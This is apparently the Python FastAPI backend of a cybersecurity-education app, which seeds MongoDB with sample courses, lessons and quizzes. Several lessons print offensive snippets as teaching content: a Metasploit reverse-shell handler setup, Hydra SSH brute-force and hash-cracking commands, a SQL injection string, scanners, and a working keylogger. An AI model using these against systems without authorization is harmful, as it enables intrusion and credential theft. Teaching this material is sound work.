from fastapi import FastAPI, APIRouter, HTTPException
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel, Field
from typing import List, Optional
import uuid
from datetime import datetime
import base64

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# Create the main app without a prefix
app = FastAPI()

# Create a router with the /api prefix
api_router = APIRouter(prefix="/api")

# Define Models
class StatusCheck(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    client_name: str
    timestamp: datetime = Field(default_factory=datetime.utcnow)

class StatusCheckCreate(BaseModel):
    client_name: str

# Course Models
class Lesson(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    title: str
    description: str
    content: str
    video_url: Optional[str] = None
    duration_minutes: int = 10
    order: int = 0

class Quiz(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    question: str
    options: List[str]
    correct_answer: int
    explanation: str

class Course(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    title: str
    description: str
    category: str
    icon: str
    color: str
    lessons: List[Lesson] = []
    quizzes: List[Quiz] = []
    difficulty: str = "Beginner"
    total_lessons: int = 0
    created_at: datetime = Field(default_factory=datetime.utcnow)

class UserProgress(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    user_id: str
    course_id: str
    completed_lessons: List[str] = []
    quiz_scores: dict = {}
    started_at: datetime = Field(default_factory=datetime.utcnow)
    last_accessed: datetime = Field(default_factory=datetime.utcnow)

class ProgressUpdate(BaseModel):
    user_id: str
    course_id: str
    lesson_id: Optional[str] = None
    quiz_id: Optional[str] = None
    score: Optional[int] = None

# Initialize sample courses
async def init_courses():
    existing = await db.courses.count_documents({})
    if existing == 0:
        courses = [
            {
                "id": str(uuid.uuid4()),
                "title": "Network Security Fundamentals",
                "description": "Learn the basics of network security, firewalls, and intrusion detection systems.",
                "category": "Network Security",
                "icon": "shield-checkmark",
                "color": "#4A90D9",
                "difficulty": "Beginner",
                "total_lessons": 5,
                "lessons": [
                    {"id": str(uuid.uuid4()), "title": "Introduction to Network Security", "description": "Understanding the basics of securing networks", "content": "Network security involves protecting computer networks from unauthorized access, misuse, and attacks. Key concepts include:\n\n**CIA Triad:**\n- Confidentiality: Ensuring data is accessible only to authorized users\n- Integrity: Maintaining data accuracy and consistency\n- Availability: Ensuring systems are accessible when needed\n\n**Common Threats:**\n- Malware (viruses, worms, trojans)\n- Phishing attacks\n- DDoS attacks\n- Man-in-the-middle attacks", "duration_minutes": 15, "order": 1},
                    {"id": str(uuid.uuid4()), "title": "Firewalls & IDS", "description": "Learn about firewalls and intrusion detection", "content": "**Firewalls:**\nA firewall is a network security device that monitors and filters incoming and outgoing network traffic.\n\n**Types of Firewalls:**\n- Packet-filtering firewalls\n- Stateful inspection firewalls\n- Application-layer firewalls\n- Next-generation firewalls (NGFW)\n\n**Intrusion Detection Systems (IDS):**\n- Network-based IDS (NIDS)\n- Host-based IDS (HIDS)\n- Signature-based detection\n- Anomaly-based detection", "duration_minutes": 20, "order": 2},
                    {"id": str(uuid.uuid4()), "title": "VPN & Encryption", "description": "Understanding VPNs and encryption protocols", "content": "**Virtual Private Networks (VPN):**\nVPNs create secure, encrypted connections over public networks.\n\n**VPN Protocols:**\n- OpenVPN\n- WireGuard\n- IPSec\n- L2TP\n\n**Encryption:**\n- Symmetric encryption (AES, DES)\n- Asymmetric encryption (RSA, ECC)\n- Hash functions (SHA-256, MD5)", "duration_minutes": 18, "order": 3},
                    {"id": str(uuid.uuid4()), "title": "Network Monitoring", "description": "Tools and techniques for network monitoring", "content": "**Network Monitoring Tools:**\n\n**Wireshark:**\n- Packet capture and analysis\n- Protocol dissection\n- Traffic filtering\n\n**Nmap:**\n- Port scanning\n- Service detection\n- OS fingerprinting\n\n**Netstat:**\n- Active connections\n- Listening ports\n- Network statistics", "duration_minutes": 22, "order": 4},
                    {"id": str(uuid.uuid4()), "title": "Wireless Security", "description": "Securing wireless networks", "content": "**Wireless Security Protocols:**\n\n- WEP (Deprecated - Insecure)\n- WPA (Improved but vulnerable)\n- WPA2 (Current standard)\n- WPA3 (Latest and most secure)\n\n**Best Practices:**\n- Use strong passwords\n- Enable MAC filtering\n- Disable WPS\n- Use guest networks\n- Regular firmware updates", "duration_minutes": 16, "order": 5}
                ],
                "quizzes": [
                    {"id": str(uuid.uuid4()), "question": "What does CIA stand for in cybersecurity?", "options": ["Central Intelligence Agency", "Confidentiality, Integrity, Availability", "Computer Internet Access", "Cyber Information Analysis"], "correct_answer": 1, "explanation": "CIA Triad stands for Confidentiality, Integrity, and Availability - the three main components of information security."},
                    {"id": str(uuid.uuid4()), "question": "Which firewall type inspects packet contents at the application layer?", "options": ["Packet-filtering firewall", "Stateful firewall", "Application-layer firewall", "Circuit-level gateway"], "correct_answer": 2, "explanation": "Application-layer firewalls can inspect the actual content of packets and make decisions based on the application protocols."},
                    {"id": str(uuid.uuid4()), "question": "Which wireless security protocol is considered the most secure?", "options": ["WEP", "WPA", "WPA2", "WPA3"], "correct_answer": 3, "explanation": "WPA3 is the latest and most secure wireless security protocol."}
                ],
                "created_at": datetime.utcnow()
            },
            {
                "id": str(uuid.uuid4()),
                "title": "Web Application Security",
                "description": "Master OWASP Top 10 vulnerabilities and secure web application development.",
                "category": "Web Security",
                "icon": "globe",
                "color": "#E74C3C",
                "difficulty": "Intermediate",
                "total_lessons": 5,
                "lessons": [
                    {"id": str(uuid.uuid4()), "title": "OWASP Top 10 Overview", "description": "Understanding the most critical web security risks", "content": "**OWASP Top 10 (2021):**\n\n1. **A01: Broken Access Control**\n2. **A02: Cryptographic Failures**\n3. **A03: Injection**\n4. **A04: Insecure Design**\n5. **A05: Security Misconfiguration**\n6. **A06: Vulnerable Components**\n7. **A07: Authentication Failures**\n8. **A08: Software Integrity Failures**\n9. **A09: Security Logging Failures**\n10. **A10: Server-Side Request Forgery**", "duration_minutes": 20, "order": 1},
                    {"id": str(uuid.uuid4()), "title": "SQL Injection Attacks", "description": "Learn to identify and prevent SQL injection", "content": "**SQL Injection:**\nA code injection technique that exploits security vulnerabilities in database queries.\n\n**Example Attack:**\n```sql\nSELECT * FROM users WHERE username = 'admin' OR '1'='1'\n```\n\n**Prevention:**\n- Use parameterized queries\n- Input validation\n- Least privilege principle\n- Web Application Firewalls", "duration_minutes": 25, "order": 2},
                    {"id": str(uuid.uuid4()), "title": "Cross-Site Scripting (XSS)", "description": "Understanding and preventing XSS attacks", "content": "**XSS Types:**\n\n1. **Stored XSS:** Malicious script stored on server\n2. **Reflected XSS:** Script reflected from server response\n3. **DOM-based XSS:** Manipulation of DOM environment\n\n**Prevention:**\n- Output encoding\n- Content Security Policy (CSP)\n- Input validation\n- HTTPOnly cookies", "duration_minutes": 22, "order": 3},
                    {"id": str(uuid.uuid4()), "title": "Authentication Security", "description": "Secure authentication implementation", "content": "**Authentication Best Practices:**\n\n- Strong password policies\n- Multi-factor authentication (MFA)\n- Secure session management\n- Rate limiting\n- Account lockout policies\n\n**Common Vulnerabilities:**\n- Credential stuffing\n- Brute force attacks\n- Session hijacking\n- Password spraying", "duration_minutes": 18, "order": 4},
                    {"id": str(uuid.uuid4()), "title": "Secure Coding Practices", "description": "Writing secure code", "content": "**Secure Development Lifecycle:**\n\n1. **Security Requirements**\n2. **Threat Modeling**\n3. **Secure Coding Standards**\n4. **Security Testing**\n5. **Code Review**\n\n**Key Principles:**\n- Defense in depth\n- Fail securely\n- Least privilege\n- Separation of duties", "duration_minutes": 20, "order": 5}
                ],
                "quizzes": [
                    {"id": str(uuid.uuid4()), "question": "What is the #1 vulnerability in OWASP Top 10 2021?", "options": ["Injection", "Broken Access Control", "XSS", "CSRF"], "correct_answer": 1, "explanation": "Broken Access Control moved to #1 in OWASP Top 10 2021, previously it was #5."},
                    {"id": str(uuid.uuid4()), "question": "Which XSS type stores malicious scripts on the server?", "options": ["Reflected XSS", "Stored XSS", "DOM-based XSS", "Self XSS"], "correct_answer": 1, "explanation": "Stored XSS (also known as Persistent XSS) stores the malicious script on the target server."},
                    {"id": str(uuid.uuid4()), "question": "What is the best defense against SQL injection?", "options": ["Input validation only", "Parameterized queries", "Firewall rules", "HTTPS"], "correct_answer": 1, "explanation": "Parameterized queries (prepared statements) are the most effective defense against SQL injection."}
                ],
                "created_at": datetime.utcnow()
            },
            {
                "id": str(uuid.uuid4()),
                "title": "Ethical Hacking Tools",
                "description": "Master essential penetration testing tools including Kali Linux, Metasploit, and more.",
                "category": "Ethical Hacking",
                "icon": "terminal",
                "color": "#2ECC71",
                "difficulty": "Advanced",
                "total_lessons": 5,
                "lessons": [
                    {"id": str(uuid.uuid4()), "title": "Kali Linux Essentials", "description": "Getting started with Kali Linux", "content": "**Kali Linux:**\nA Debian-based Linux distribution designed for penetration testing.\n\n**Key Features:**\n- 600+ pre-installed tools\n- Customizable\n- Open source\n- Regular updates\n\n**Essential Commands:**\n```bash\nsudo apt update\nsudo apt upgrade\nifconfig\nnmap -sV target\n```", "duration_minutes": 25, "order": 1},
                    {"id": str(uuid.uuid4()), "title": "Metasploit Framework", "description": "Introduction to Metasploit", "content": "**Metasploit Components:**\n\n- **msfconsole:** Main interface\n- **Exploits:** Code to exploit vulnerabilities\n- **Payloads:** Code executed after exploitation\n- **Auxiliary:** Scanning and fuzzing modules\n\n**Basic Usage:**\n```\nmsfconsole\nuse exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST <IP>\nexploit\n```", "duration_minutes": 30, "order": 2},
                    {"id": str(uuid.uuid4()), "title": "Nmap Advanced Scanning", "description": "Network reconnaissance with Nmap", "content": "**Nmap Scan Types:**\n\n- **-sS:** TCP SYN scan (stealth)\n- **-sT:** TCP connect scan\n- **-sU:** UDP scan\n- **-sV:** Version detection\n- **-O:** OS detection\n\n**Advanced Commands:**\n```bash\nnmap -sS -sV -O -A target\nnmap --script vuln target\nnmap -p- target\n```", "duration_minutes": 22, "order": 3},
                    {"id": str(uuid.uuid4()), "title": "Burp Suite for Web Testing", "description": "Web application testing with Burp Suite", "content": "**Burp Suite Tools:**\n\n- **Proxy:** Intercept HTTP/S traffic\n- **Scanner:** Automated vulnerability scanning\n- **Intruder:** Automated attacks\n- **Repeater:** Manual request modification\n- **Decoder:** Encode/decode data\n\n**Workflow:**\n1. Configure browser proxy\n2. Capture requests\n3. Analyze and modify\n4. Test for vulnerabilities", "duration_minutes": 28, "order": 4},
                    {"id": str(uuid.uuid4()), "title": "Password Cracking Tools", "description": "Understanding password cracking techniques", "content": "**Password Cracking Tools:**\n\n**John the Ripper:**\n```bash\njohn --wordlist=rockyou.txt hash.txt\n```\n\n**Hashcat:**\n```bash\nhashcat -m 0 -a 0 hash.txt wordlist.txt\n```\n\n**Hydra:**\n```bash\nhydra -l admin -P passwords.txt ssh://target\n```\n\n**Note:** Only use on systems you have permission to test!", "duration_minutes": 24, "order": 5}
                ],
                "quizzes": [
                    {"id": str(uuid.uuid4()), "question": "What is the main interface for Metasploit?", "options": ["msfvenom", "msfconsole", "msfpayload", "msfencode"], "correct_answer": 1, "explanation": "msfconsole is the main command-line interface for interacting with the Metasploit Framework."},
                    {"id": str(uuid.uuid4()), "question": "Which Nmap flag performs a stealth SYN scan?", "options": ["-sT", "-sU", "-sS", "-sV"], "correct_answer": 2, "explanation": "The -sS flag performs a TCP SYN scan, also known as a stealth or half-open scan."},
                    {"id": str(uuid.uuid4()), "question": "Which Burp Suite tool intercepts HTTP traffic?", "options": ["Scanner", "Proxy", "Intruder", "Repeater"], "correct_answer": 1, "explanation": "The Proxy tool in Burp Suite intercepts and allows modification of HTTP/HTTPS traffic."}
                ],
                "created_at": datetime.utcnow()
            },
            {
                "id": str(uuid.uuid4()),
                "title": "Python for Security",
                "description": "Learn to write security tools and automate tasks using Python.",
                "category": "Programming",
                "icon": "code-slash",
                "color": "#9B59B6",
                "difficulty": "Intermediate",
                "total_lessons": 5,
                "lessons": [
                    {"id": str(uuid.uuid4()), "title": "Python Security Basics", "description": "Introduction to Python for security professionals", "content": "**Why Python for Security?**\n\n- Easy to learn and read\n- Extensive libraries\n- Cross-platform\n- Rapid prototyping\n\n**Essential Libraries:**\n```python\nimport socket\nimport requests\nimport scapy\nimport hashlib\nimport cryptography\n```", "duration_minutes": 18, "order": 1},
                    {"id": str(uuid.uuid4()), "title": "Network Programming", "description": "Socket programming and network tools", "content": "**Socket Programming:**\n\n```python\nimport socket\n\n# Port Scanner\ndef scan_port(ip, port):\n    sock = socket.socket()\n    sock.settimeout(1)\n    result = sock.connect_ex((ip, port))\n    sock.close()\n    return result == 0\n\n# Scan common ports\nfor port in [21, 22, 80, 443]:\n    if scan_port('target', port):\n        print(f'Port {port} is open')\n```", "duration_minutes": 25, "order": 2},
                    {"id": str(uuid.uuid4()), "title": "Web Scraping & Automation", "description": "Automating web tasks for security testing", "content": "**Web Automation:**\n\n```python\nimport requests\nfrom bs4 import BeautifulSoup\n\n# Directory Brute Force\ndef dir_buster(url, wordlist):\n    for word in wordlist:\n        test_url = f'{url}/{word}'\n        resp = requests.get(test_url)\n        if resp.status_code == 200:\n            print(f'Found: {test_url}')\n```", "duration_minutes": 22, "order": 3},
                    {"id": str(uuid.uuid4()), "title": "Cryptography in Python", "description": "Implementing encryption and hashing", "content": "**Hashing:**\n```python\nimport hashlib\n\ndef hash_password(password):\n    return hashlib.sha256(\n        password.encode()\n    ).hexdigest()\n```\n\n**Encryption:**\n```python\nfrom cryptography.fernet import Fernet\n\nkey = Fernet.generate_key()\nf = Fernet(key)\nencrypted = f.encrypt(b'secret')\n```", "duration_minutes": 20, "order": 4},
                    {"id": str(uuid.uuid4()), "title": "Building Security Tools", "description": "Creating custom security utilities", "content": "**Keylogger Example:**\n```python\n# Educational purposes only!\nfrom pynput import keyboard\n\ndef on_press(key):\n    with open('log.txt', 'a') as f:\n        f.write(str(key))\n\nwith keyboard.Listener(\n    on_press=on_press) as listener:\n    listener.join()\n```\n\n**Always get proper authorization before testing!**", "duration_minutes": 26, "order": 5}
                ],
                "quizzes": [
                    {"id": str(uuid.uuid4()), "question": "Which Python library is commonly used for packet manipulation?", "options": ["requests", "socket", "scapy", "hashlib"], "correct_answer": 2, "explanation": "Scapy is a powerful Python library for packet manipulation and network scanning."},
                    {"id": str(uuid.uuid4()), "question": "What function is used to create a SHA-256 hash in Python?", "options": ["hashlib.md5()", "hashlib.sha256()", "hash.sha256()", "crypto.sha256()"], "correct_answer": 1, "explanation": "hashlib.sha256() creates a SHA-256 hash object in Python."},
                    {"id": str(uuid.uuid4()), "question": "Which library provides the Fernet symmetric encryption?", "options": ["hashlib", "pycrypto", "cryptography", "ssl"], "correct_answer": 2, "explanation": "The cryptography library provides Fernet symmetric encryption in Python."}
                ],
                "created_at": datetime.utcnow()
            },
            {
                "id": str(uuid.uuid4()),
                "title": "Bash Scripting for Hackers",
                "description": "Automate security tasks and system administration with Bash.",
                "category": "Programming",
                "icon": "terminal-outline",
                "color": "#F39C12",
                "difficulty": "Intermediate",
                "total_lessons": 4,
                "lessons": [
                    {"id": str(uuid.uuid4()), "title": "Bash Fundamentals", "description": "Essential Bash scripting for security", "content": "**Bash Basics:**\n\n```bash\n#!/bin/bash\n# Variables\nTARGET=\"192.168.1.1\"\nPORTS=\"21 22 80 443\"\n\n# Loops\nfor port in $PORTS; do\n    echo \"Scanning port $port\"\ndone\n\n# Conditionals\nif [ -f \"file.txt\" ]; then\n    echo \"File exists\"\nfi\n```", "duration_minutes": 20, "order": 1},
                    {"id": str(uuid.uuid4()), "title": "Reconnaissance Scripts", "description": "Building recon automation tools", "content": "**Subdomain Enumeration:**\n\n```bash\n#!/bin/bash\nDOMAIN=$1\nWORDLIST=\"subdomains.txt\"\n\nwhile read sub; do\n    host \"$sub.$DOMAIN\" | \\\n    grep -q \"has address\" && \\\n    echo \"Found: $sub.$DOMAIN\"\ndone < $WORDLIST\n```", "duration_minutes": 22, "order": 2},
                    {"id": str(uuid.uuid4()), "title": "Log Analysis", "description": "Parsing and analyzing security logs", "content": "**Log Analysis:**\n\n```bash\n#!/bin/bash\n# Find failed SSH attempts\ngrep \"Failed password\" /var/log/auth.log | \\\nawk '{print $11}' | \\\nsort | uniq -c | sort -rn\n\n# Extract IPs from logs\ngrep -oE \"[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\" \\\n    /var/log/apache2/access.log\n```", "duration_minutes": 18, "order": 3},
                    {"id": str(uuid.uuid4()), "title": "Automation & Cron Jobs", "description": "Scheduling security tasks", "content": "**Cron Jobs:**\n\n```bash\n# Edit crontab\ncrontab -e\n\n# Run backup daily at 2 AM\n0 2 * * * /home/user/backup.sh\n\n# Scan network every hour\n0 * * * * /home/user/scan.sh\n\n# Check for updates weekly\n0 0 * * 0 apt update && apt upgrade -y\n```", "duration_minutes": 16, "order": 4}
                ],
                "quizzes": [
                    {"id": str(uuid.uuid4()), "question": "Which shebang line indicates a Bash script?", "options": ["#!/bin/sh", "#!/bin/bash", "#!/usr/bin/python", "#/bin/bash"], "correct_answer": 1, "explanation": "#!/bin/bash is the shebang that specifies the Bash interpreter for the script."},
                    {"id": str(uuid.uuid4()), "question": "What command schedules recurring tasks in Linux?", "options": ["schedule", "at", "cron", "task"], "correct_answer": 2, "explanation": "Cron is the time-based job scheduler in Unix-like operating systems."}
                ],
                "created_at": datetime.utcnow()
            }
        ]
        
        for course in courses:
            await db.courses.insert_one(course)
        print("Sample courses initialized")

@app.on_event("startup")
async def startup_event():
    await init_courses()

# Add your routes to the router
@api_router.get("/")
async def root():
    return {"message": "Abdulmalek Majeed Cybersecurity Academy API"}

@api_router.post("/status", response_model=StatusCheck)
async def create_status_check(input: StatusCheckCreate):
    status_dict = input.dict()
    status_obj = StatusCheck(**status_dict)
    _ = await db.status_checks.insert_one(status_obj.dict())
    return status_obj

@api_router.get("/status", response_model=List[StatusCheck])
async def get_status_checks():
    status_checks = await db.status_checks.find().to_list(1000)
    return [StatusCheck(**status_check) for status_check in status_checks]

# Course endpoints
@api_router.get("/courses")
async def get_courses():
    courses = await db.courses.find().to_list(100)
    # Return simplified course data for listing
    return [{
        "id": c["id"],
        "title": c["title"],
        "description": c["description"],
        "category": c["category"],
        "icon": c["icon"],
        "color": c["color"],
        "difficulty": c["difficulty"],
        "total_lessons": c.get("total_lessons", len(c.get("lessons", [])))
    } for c in courses]

@api_router.get("/courses/{course_id}")
async def get_course(course_id: str):
    course = await db.courses.find_one({"id": course_id})
    if not course:
        raise HTTPException(status_code=404, detail="Course not found")
    course.pop("_id", None)
    return course

@api_router.get("/courses/category/{category}")
async def get_courses_by_category(category: str):
    courses = await db.courses.find({"category": category}).to_list(100)
    return [{
        "id": c["id"],
        "title": c["title"],
        "description": c["description"],
        "category": c["category"],
        "icon": c["icon"],
        "color": c["color"],
        "difficulty": c["difficulty"],
        "total_lessons": c.get("total_lessons", len(c.get("lessons", [])))
    } for c in courses]

# Progress endpoints
@api_router.post("/progress")
async def update_progress(progress: ProgressUpdate):
    existing = await db.progress.find_one({
        "user_id": progress.user_id,
        "course_id": progress.course_id
    })
    
    if existing:
        update_data = {"last_accessed": datetime.utcnow()}
        if progress.lesson_id:
            await db.progress.update_one(
                {"_id": existing["_id"]},
                {
                    "$addToSet": {"completed_lessons": progress.lesson_id},
                    "$set": update_data
                }
            )
        if progress.quiz_id and progress.score is not None:
            await db.progress.update_one(
                {"_id": existing["_id"]},
                {
                    "$set": {
                        f"quiz_scores.{progress.quiz_id}": progress.score,
                        **update_data
                    }
                }
            )
    else:
        new_progress = {
            "id": str(uuid.uuid4()),
            "user_id": progress.user_id,
            "course_id": progress.course_id,
            "completed_lessons": [progress.lesson_id] if progress.lesson_id else [],
            "quiz_scores": {progress.quiz_id: progress.score} if progress.quiz_id and progress.score is not None else {},
            "started_at": datetime.utcnow(),
            "last_accessed": datetime.utcnow()
        }
        await db.progress.insert_one(new_progress)
    
    return {"status": "success"}

@api_router.get("/progress/{user_id}")
async def get_user_progress(user_id: str):
    progress = await db.progress.find({"user_id": user_id}).to_list(100)
    for p in progress:
        p.pop("_id", None)
    return progress

@api_router.get("/progress/{user_id}/{course_id}")
async def get_course_progress(user_id: str, course_id: str):
    progress = await db.progress.find_one({
        "user_id": user_id,
        "course_id": course_id
    })
    if progress:
        progress.pop("_id", None)
        return progress
    return {
        "user_id": user_id,
        "course_id": course_id,
        "completed_lessons": [],
        "quiz_scores": {}
    }

# Include the router in the main app
app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()
